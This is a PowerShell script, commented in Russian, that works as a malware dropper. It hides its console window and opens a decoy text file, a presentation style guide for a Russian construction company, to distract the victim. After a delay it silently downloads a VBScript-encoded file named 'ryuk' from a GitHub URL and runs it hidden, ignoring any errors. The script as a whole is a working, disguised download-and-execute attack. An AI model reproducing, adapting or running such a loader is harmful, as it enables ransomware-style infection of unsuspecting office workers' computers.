# Скрываем окно PowerShell
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)  # 0 = hide

# Первая часть - создание текстового файла
$fileName = "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Данный документ регламентирует единые стандарты для создания всех презентаций компании «Капитал – Строитель жилья!» (kapital62.ru). Цель — обеспечить узнаваемость, профессиональный вид и целостность всех материалов.

1. ЦВЕТОВАЯ ПАЛИТРА (Брендбук)
Используйте следующую цветовую схему, основанную на анализе сайта компании:

    Основной цвет (Primary): #0A2D6C (Темно-синий, цвет доверия и надежности)
        Используется для заголовков, ключевых акцентов, фона важных блоков.

    Акцентный цвет 1 (Accent 1): #00A79D (Бирюзово-зеленый, цвет роста и современности)
        Используется для кнопок, иконок, графиков, подзаголовков, выделения важной информации.

    Акцентный цвет 2 (Accent 2): #FF7F00 (Оранжевый, цвет энергии и призыва к действию)
        Используется ограниченно для самых важных цифр, кнопок «Купить», «Оставить заявку».

    Нейтральные цвета:
        Темный текст (Dark Gray): #333333 (Для основного текста).
        Светлый текст (Light Gray): #767676 (Для второстепенного текста).
        Фоновый цвет (Background): #FFFFFF (Белый) или #F5F7FA (Светло-серый).

2. ТИПОГРАФИКА (ШРИФТЫ)
Во избежание проблем с совместимостью использовать следующие стандартные шрифты Windows:

    Заголовки (Headlines): Calibri Light или Arial Narrow.
        Размер: 32-44 pt. Прописные или строчные буквы. Цвет: #0A2D6C или #333333.

    Основной текст (Body Text): Calibri.
        Размер: 18-24 pt. Межстрочный интервал: 1.0-1.15. Цвет: #333333.

    Акцентный текст/Подписи (Accent Text/Captions): Calibri.
        Размер: 14-16 pt. Можно использовать курсив или цвет #767676.

    Важное правило: Не используйте более 3-х разных шрифтов на одном слайде.
	
3. РАБОЧА С ИЗОБРАЖЕНИЯМИ И МЕДИА
Дополните слайды визуальными материалами там, где сочтёте нужным — из папки "Медиа для презентаций" или с фотостоков, например Unsplash.com.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# Задержка 40 секунд
Start-Sleep -Seconds 40

# Вторая часть - скачивание и запуск файла
$Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"  # Явно указываем имя файла
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

# Скачивание и запуск (также скрытно)
try {
    # Используем более скрытный метод скачивания
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    # Запускаем процесс скрытно
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
    # В случае ошибки просто игнорируем
}

# Завершаем скрипт
exit
